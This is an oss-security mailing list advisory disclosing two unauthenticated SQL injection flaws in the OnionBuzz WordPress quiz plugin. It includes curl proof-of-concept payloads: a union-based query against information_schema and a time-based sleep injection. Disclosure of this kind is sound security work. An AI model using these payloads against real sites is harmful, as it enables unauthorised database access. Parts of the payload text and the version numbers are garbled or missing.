  oss-security - Two unauthenticated SQL injection vulnerabilities in Onionbuzz  WordPress plugin            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Sat, 20 Jul From: Eugene Kolo <eugene@...enekolo.com> To: oss-security@...ts.openwall.com Subject: Two unauthenticated SQL injection vulnerabilities in Onionbuzz  WordPress plugin  Two unauthenticated/unprivileged SQL injection vulnerabilities in the Viral Quiz Maker - Onionbuzz WordPress plugin.  Information =========== Affected Product: Viral Quiz Maker - OnionBuzz WordPress plugin Vendor Homepage: Onionbuzz.com Vulnerability Type: SQL Injection Discoverer: Eugene Kolodenker Date:  1)  Description =========== Prior to you could exploit the `points` parameter in the `ob_get_results` ajax nopriv handler due to there being no sanitization on the points argument. The points parameter is not sanitized prior to be used in a SQL query in getResultByPointsTrivia. This allows an unauthenticated/unprivileged user to perform a SQL injection attack capable of remote code execution and information disclosure.  Proof of Concept (POC) ====================== ``` curl http://site/wp-admin/admin-ajax.php?action=ob_get_results --data or 1=0 union all select from information_schema.tables;#" ```  And get back: ``` {"quiz_id":1,"points":"1 or 1=0 union all select from information_schema.tables;#","title":<DBVERSION>","description":"CHARACTER_SETS","featured_image":"<img ```   2)  Description =========== Prior to you could exploit the `id` parameter in the `set_count` ajax nopriv handler due to there being no sanitization on the id argument. The id parameter is not sanitized prior to be used in a SQL query in saveQuestionVote. This allows an unauthenticated/unprivileged user to perform a SQL injection attack capable of remote code execution and information disclosure.   Proof of Concept (POC) ======================  ``` curl http://site/wp-admin/admin-ajax.php?type=set_count --data "action=ob_question_votes&id=1 or sleep(10);#" ```   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      